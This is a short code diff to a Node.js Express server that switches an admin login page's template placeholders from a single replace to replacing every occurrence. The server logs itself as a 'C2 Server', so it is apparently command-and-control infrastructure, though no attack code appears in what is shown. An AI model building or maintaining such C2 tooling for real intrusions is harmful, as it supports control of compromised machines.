@@ -575,7 +575,7 @@ app.all("/", (req, res) => {
     else
       e="Invalid credentials";
   }
-  res.type("html").send(ADMIN_HTML.replace("__TOKEN__",t).replace("__ERROR__",e));
+  res.type("html").send(ADMIN_HTML.split("__TOKEN__").join(t).split("__ERROR__").join(e));
 });
 
 app.listen(PORT, "0.0.0.0", () => console.log("C2 Server on port "+PORT));
